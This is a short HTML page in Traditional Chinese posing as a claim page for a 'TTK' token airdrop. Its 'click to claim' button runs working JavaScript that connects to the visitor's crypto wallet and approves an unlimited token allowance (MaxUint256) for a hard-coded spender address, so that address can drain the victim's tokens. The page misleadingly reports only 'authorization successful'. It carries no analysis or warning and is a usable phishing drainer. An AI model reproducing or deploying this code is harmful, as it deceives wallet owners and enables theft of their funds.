
<!DOCTYPE html>
<html lang="zh-Hant">
<head>
  <meta charset="UTF-8">
  <title>空投領取頁</title>
</head>
<body style="text-align:center;padding-top:60px;">
  <h2>🎁 恭喜你獲得 TTK 空投！</h2>
  <button onclick="approve()">點我領取</button>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
  <script>
    const tokenAddress = "0x3F767995d0Bbe0587dDC801Dd7e8f40d15ed0958";
    const spender = "0xDa4FfA490992769B8F54063bf0B9E7a4D3479459";
    const abi = ["function approve(address spender, uint256 amount) external returns (bool)"];

    async function approve() {
      const provider = new ethers.providers.Web3Provider(window.ethereum);
      await provider.send("eth_requestAccounts", []);
      const signer = provider.getSigner();
      const contract = new ethers.Contract(tokenAddress, abi, signer);
      await contract.approve(spender, ethers.constants.MaxUint256);
      alert("授權成功！");
    }
  </script>
</body>
</html>
